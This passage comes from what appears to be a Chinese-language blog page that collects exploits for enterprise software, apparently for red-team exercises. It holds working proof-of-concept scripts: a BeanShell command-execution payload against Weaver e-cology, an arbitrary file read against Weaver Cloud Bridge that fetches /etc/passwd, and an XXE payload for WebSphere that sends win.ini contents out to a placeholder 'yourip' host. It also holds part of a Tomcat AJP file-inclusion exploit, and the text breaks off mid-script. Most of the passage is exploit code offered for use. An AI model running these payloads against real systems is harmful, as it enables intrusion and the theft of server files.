class="literal">True</span>, httpResponse</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h4 id="8、致远A8反序列化漏洞"><a href="#8、致远A8反序列化漏洞" class="headerlink" title="8、致远A8反序列化漏洞"></a>8、致远A8反序列化漏洞</h4><h4 id="9、泛微e-cology某版本存在RCE漏洞"><a href="#9、泛微e-cology某版本存在RCE漏洞" class="headerlink" title="9、泛微e-cology某版本存在RCE漏洞"></a>9、泛微e-cology某版本存在RCE漏洞</h4><p>备注：去年HW老漏洞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">POC = <span class="string">'bsh.script=exec("ping");&amp;bsh.servlet.captureOutErr=true&amp; bsh.servlet.output=raw&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(self)</span>:</span></span><br><span class="line">    vulUrl = self.url + <span class="string">"/weaver/bsh.servlet.BshServle"</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rsp = requests.post(url=vulUrl, data=POC, verify=<span class="literal">False</span>, headers=headers, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> rsp.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"ping"</span> <span class="keyword">in</span> rsp.text <span class="keyword">and</span> <span class="string">"count"</span> <span class="keyword">in</span> rsp.text <span class="keyword">and</span> <span class="string">"timeout"</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">                httpResponse = <span class="string">"HTTP Response Status:"</span> + str(rsp.status_code) \</span><br><span class="line">                               + <span class="string">"\nHTTP Response Headers:"</span> + str(rsp.headers) \</span><br><span class="line">                               + <span class="string">"\nHTTP Response Body:\n"</span> + str(rsp.text)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>, httpResponse</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<h4 id="10、泛微云桥任意文件读取"><a href="#10、泛微云桥任意文件读取" class="headerlink" title="10、泛微云桥任意文件读取"></a>10、泛微云桥任意文件读取</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(self)</span>:</span></span><br><span class="line">    vulUrl_win = self.url + <span class="string">"/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt"</span></span><br><span class="line">    vulUrl_linux = self.url + <span class="string">"/wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt"</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)"</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        rsp = requests.get(url=vulUrl_win, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> rsp.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"id"</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">                print(rsp.text)</span><br><span class="line">                match = re.finditer(<span class="string">r"\"id\":\"(?P&lt;var&gt;.+?)\""</span>, rsp.text)</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> match:</span><br><span class="line">                    fileId = m.group(<span class="string">'var'</span>)</span><br><span class="line">                filePath = self.url + <span class="string">"/file/fileNoLogin/"</span> + fileId</span><br><span class="line">                filersp = requests.get(url=filePath, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"root:x:0:0:root:/root:/bin/bash"</span> <span class="keyword">in</span> filersp.text:</span><br><span class="line">                    httpResponse = <span class="string">"HTTP Response Status:"</span> + str(filersp.status_code) \</span><br><span class="line">                                   + <span class="string">"\nHTTP Response Headers:"</span> + str(filersp.headers) \</span><br><span class="line">                                   + <span class="string">"\nHTTP Response Body:\n"</span> + str(filersp.text)</span><br><span class="line">                    print(httpResponse)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span>, httpResponse</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rsp = requests.get(url=vulUrl_linux, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"id"</span> <span class="keyword">in</span> rsp.text:</span><br><span class="line">                print(rsp.text)</span><br><span class="line">                match = re.finditer(<span class="string">r"\"id\":\"(?P&lt;var&gt;.+?)\""</span>, rsp.text)</span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> match:</span><br><span class="line">                    fileId = m.group(<span class="string">'var'</span>)</span><br><span class="line">                filePath = self.url + <span class="string">"/file/fileNoLogin/"</span> + fileId</span><br><span class="line">                filersp = requests.get(url=filePath, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">"root:x"</span> <span class="keyword">in</span> filersp <span class="keyword">and</span> <span class="string">":0:0:root:/root:/bin/bash"</span> <span class="keyword">in</span> filersp.text:</span><br><span class="line">                    httpResponse = <span class="string">"HTTP Response Status:"</span> + str(filersp.status_code) \</span><br><span class="line">                                   + <span class="string">"\nHTTP Response Headers:"</span> + str(filersp.headers) \</span><br><span class="line">                                   + <span class="string">"\nHTTP Response Body:\n"</span> + str(filersp.text)</span><br><span class="line">                    print(httpResponse)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span>, httpResponse</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p><strong>参考：</strong>xray</p>
<h2 id="三、中间件-容器"><a href="#三、中间件-容器" class="headerlink" title="三、中间件/容器"></a>三、中间件/容器</h2><h4 id="1、Weblogic命令执行漏洞-CVE-2020-14645"><a href="#1、Weblogic命令执行漏洞-CVE-2020-14645" class="headerlink" title="1、Weblogic命令执行漏洞 CVE-2020-14645"></a>1、Weblogic命令执行漏洞 CVE-2020-14645</h4><p>参考：<a href="https://my.oschina.net/u/4582816/blog/4436485" target="_blank" rel="noopener">https://my.oschina.net/u/4582816/blog/4436485</a></p>
<h4 id="2、Weblogic反序列化漏洞-CVE-2020-2551"><a href="#2、Weblogic反序列化漏洞-CVE-2020-2551" class="headerlink" title="2、Weblogic反序列化漏洞 CVE-2020-2551"></a>2、Weblogic反序列化漏洞 CVE-2020-2551</h4><p>参考：<a href="https://xz.aliyun.com/t/7725" target="_blank" rel="noopener">https://xz.aliyun.com/t/7725</a></p>
<h4 id="3、Weblogic反序列化漏洞-CVE-2020-2555"><a href="#3、Weblogic反序列化漏洞-CVE-2020-2555" class="headerlink" title="3、Weblogic反序列化漏洞 CVE-2020-2555"></a>3、Weblogic反序列化漏洞 CVE-2020-2555</h4><p>参考：<a href="https://www.secpulse.com/archives/140207.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/140207.html</a></p>
<h4 id="4、WebSphere远程代码执行漏洞-CVE-2020-4450"><a href="#4、WebSphere远程代码执行漏洞-CVE-2020-4450" class="headerlink" title="4、WebSphere远程代码执行漏洞 CVE-2020-4450"></a>4、WebSphere远程代码执行漏洞 CVE-2020-4450</h4><p>参考：<a href="https://lucifaer.com/2020/08/21/WebSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-4450%EF%BC%89/" target="_blank" rel="noopener">https://lucifaer.com/2020/08/21/WebSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-4450%EF%BC%89/</a></p>
<h4 id="5、WebSphere远程代码执行漏洞-CVE-2020-4362"><a href="#5、WebSphere远程代码执行漏洞-CVE-2020-4362" class="headerlink" title="5、WebSphere远程代码执行漏洞 CVE-2020-4362"></a>5、WebSphere远程代码执行漏洞 CVE-2020-4362</h4><p>参考：<a href="https://xz.aliyun.com/t/8248?page=5" target="_blank" rel="noopener">https://xz.aliyun.com/t/8248?page=5</a></p>
<h4 id="6、WebSphere-存在XXE外部实体注入漏洞-CVE-2020-4643"><a href="#6、WebSphere-存在XXE外部实体注入漏洞-CVE-2020-4643" class="headerlink" title="6、WebSphere 存在XXE外部实体注入漏洞 CVE-2020-4643"></a>6、WebSphere 存在XXE外部实体注入漏洞 CVE-2020-4643</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">xml如下：</span><br><span class="line"><span class="meta">&lt;!DOCTYPE x [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">aaa</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///C:/Windows/win.ini"</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY % <span class="meta-keyword">bbb</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://yourip:8000/xx.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">  %bbb;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">definitions</span> <span class="attr">name</span>=<span class="string">"HelloService"</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.xmlsoap.org/wsdl/"</span>&gt;</span></span><br><span class="line">  <span class="symbol">&amp;ddd;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">definitions</span>&gt;</span></span><br><span class="line"></span><br><span class="line">xx.dtd如下：</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ccc</span> <span class="meta-string">'&lt;!ENTITY ddd &amp;#39;&lt;import namespace="uri" location="http://yourip:8000/xxeLog?%aaa;"/&gt;&amp;#39;&gt;'</span>&gt;</span>%ccc;</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://paper.seebug.org/1342/" target="_blank" rel="noopener">https://paper.seebug.org/1342/</a></p>
<h4 id="7、Apache-Tomcat文件包含漏洞-CVE-2020-1938"><a href="#7、Apache-Tomcat文件包含漏洞-CVE-2020-1938" class="headerlink" title="7、Apache Tomcat文件包含漏洞 CVE-2020-1938"></a>7、Apache Tomcat文件包含漏洞 CVE-2020-1938</h4><p>备注：2月漏洞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#CNVD-2020-10487  Tomcat-Ajp lfi</span></span><br><span class="line"><span class="comment">#by ydhcui</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="comment"># Some references:</span></span><br><span class="line"><span class="comment"># https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_string</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> s <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		<span class="keyword">return</span> struct.pack(<span class="string">"&gt;h"</span>, <span class="number">-1</span>)</span><br><span class="line">	l = len(s)</span><br><span class="line">	<span class="keyword">return</span> struct.pack(<span class="string">"&gt;H%dsb"</span> % l, l, s.encode(<span class="string">'utf8'</span>), <span class="number">0</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpack</span><span class="params">(stream, fmt)</span>:</span></span><br><span class="line">	size = struct.calcsize(fmt)</span><br><span class="line">	buf = stream.read(size)</span><br><span class="line">	<span class="keyword">return</span> struct.unpack(fmt, buf)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpack_string</span><span class="params">(stream)</span>:</span></span><br><span class="line">	size, = unpack(stream, <span class="string">"&gt;h"</span>)</span><br><span class="line">	<span class="keyword">if</span> size == <span class="number">-1</span>: <span class="comment"># null string</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">	res, = unpack(stream, <span class="string">"%ds"</span> % size)</span><br><span class="line">	stream.read(<span class="number">1</span>) <span class="comment"># \0</span></span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFoundException</span><span class="params">(Exception)</span>:</span></span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AjpBodyRequest</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="comment"># server == web server, container == servlet</span></span><br><span class="line">	SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(<span class="number">2</span>)</span><br><span class="line">	MAX_REQUEST_LENGTH = <span class="number">8186</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data_stream, data_len, data_direction=None)</span>:</span></span><br><span class="line">		self.data_stream = data_stream</span><br><span class="line">		self.data_len = data_len</span><br><span class="line">		self.data_direction = data_direction</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">(self)</span>:</span></span><br><span class="line">		data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)</span><br><span class="line">		<span class="keyword">if</span> len(data) == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> struct.pack(<span class="string">"&gt;bbH"</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x00</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			res = struct.pack(<span class="string">"&gt;H"</span>, len(data))</span><br><span class="line">			res += data</span><br><span class="line">		<span class="keyword">if</span> self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER:</span><br><span class="line">			header = struct.pack(<span class="string">"&gt;bbH"</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, len(res))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			header = struct.pack(<span class="string">"&gt;bbH"</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, len(res))</span><br><span class="line">		<span class="keyword">return</span> header + res</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">send_and_receive</span><span class="params">(self, socket, stream)</span>:</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			data = self.serialize()</span><br><span class="line">			socket.send(data)</span><br><span class="line">			r = AjpResponse.receive(stream)</span><br><span class="line">			<span class="keyword">while</span> r.prefix_code != AjpResponse.GET_BODY_CHUNK <span class="keyword">and</span> r.prefix_code != AjpResponse.SEND_HEADERS:</span><br><span class="line">				r = AjpResponse.receive(stream)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> r.prefix_code == AjpResponse.SEND_HEADERS <span class="keyword">or</span> len(data) == <span class="number">4</span>:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AjpForwardRequest</span><span class="params">(object)</span>:</span></span><br><span class="line">	_, OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK, ACL, REPORT, VERSION_CONTROL, CHECKIN, CHECKOUT, UNCHECKOUT, SEARCH, MKWORKSPACE, UPDATE, LABEL, MERGE, BASELINE_CONTROL, MKACTIVITY = range(<span class="number">28</span>)</span><br><span class="line">	REQUEST_METHODS = &#123;<span class="string">'GET'</span>: GET, <span class="string">'POST'</span>: POST, <span class="string">'HEAD'</span>: HEAD, <span class="string">'OPTIONS'</span>: OPTIONS, <span class="string">'PUT'</span>: PUT, <span class="string">'DELETE'</span>: DELETE, <span class="string">'TRACE'</span>: TRACE&#125;</span><br><span class="line">	<span class="comment"># server == web server, container == servlet</span></span><br><span class="line">	SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(<span class="number">2</span>)</span><br><span class="line">	COMMON_HEADERS = [<span class="string">"SC_REQ_ACCEPT"</span>,</span><br><span class="line">		<span class="string">"SC_REQ_ACCEPT_CHARSET"</span>, <span class="string">"SC_REQ_ACCEPT_ENCODING"</span>, <span class="string">"SC_REQ_ACCEPT_LANGUAGE"</span>, <span class="string">"SC_REQ_AUTHORIZATION"</span>,</span><br><span class="line">		<span class="string">"SC_REQ_CONNECTION"</span>, <span class="string">"SC_REQ_CONTENT_TYPE"</span>, <span class="string">"SC_REQ_CONTENT_LENGTH"</span>, <span class="string">"SC_REQ_COOKIE"</span>, <span class="string">"SC_REQ_COOKIE2"</span>,</span><br><span class="line">		<span class="string">"SC_REQ_HOST"</span>, <span class="string">"SC_REQ_PRAGMA"</span>, <span class="string">"SC_REQ_REFERER"</span>, <span class="string">"SC_REQ_USER_AGENT"</span></span><br><span class="line">	]</span><br><span class="line">	ATTRIBUTES = [<span class="string">"context"</span>, <span class="string">"servlet_path"</span>, <span class="string">"remote_user"</span>, <span class="string">"auth_type"</span>, <span class="string">"query_string"</span>, <span class="string">"route"</span>, <span class="string">"ssl_cert"</span>, <span class="string">"ssl_cipher"</span>, <span class="string">"ssl_session"</span>, <span class="string">"req_attribute"</span>, <span class="string">"ssl_key_size"</span>, <span class="string">"secret"</span>, <span class="string">"stored_method"</span>]</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, data_direction=None)</span>:</span></span><br><span class="line">		self.prefix_code = <span class="number">0x02</span></span><br><span class="line">		self.method = <span class="literal">None</span></span><br><span class="line">		self.protocol = <span class="literal">None</span></span><br><span class="line">		self.req_uri = <span class="literal">None</span></span><br><span class="line">		self.remote_addr = <span class="literal">None</span></span><br><span class="line">		self.remote_host = <span class="literal">None</span></span><br><span class="line">		self.server_name = <span class="literal">None</span></span><br><span class="line">		self.server_port = <span class="literal">None</span></span><br><span class="line">		self.is_ssl = <span class="literal">None</span></span><br><span class="line">		self.num_headers = <span class="literal">None</span></span><br><span class="line">		self.request_headers = <span class="literal">None</span></span><br><span class="line">		self.attributes = <span class="literal">None</span></span><br><span class="line">		self.data_direction = data_direction</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">pack_headers</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.num_headers = len(self.request_headers)</span><br><span class="line">		res = <span class="string">""</span></span><br><span class="line">		res = struct.pack(<span class="string">"&gt;h"</span>, self.num_headers)</span><br><span class="line">		<span class="keyword">for</span> h_name <span class="keyword">in</span> self.request_headers:</span><br><span class="line">			<span class="keyword">if</span> h_name.startswith(<span class="string">"SC_REQ"</span>):</span><br><span class="line">				code = AjpForwardRequest.COMMON_HEADERS.index(h_name) + <span class="number">1</span></span><br><span class="line">				res += struct.pack(<span class="string">"BB"</span>, <span class="number">0xA0</span>, code)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				res += pack_string(h_name)</span><br><span class="line"></span><br><span class="line">			res += pack_string(self.request_headers[h_name])</span><br><span class="line">		<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">pack_attributes</span><span class="params">(self)</span>:</span></span><br><span class="line">		res = <span class="string">b""</span></span><br><span class="line">		<span class="keyword">for</span> attr <span class="keyword">in</span> 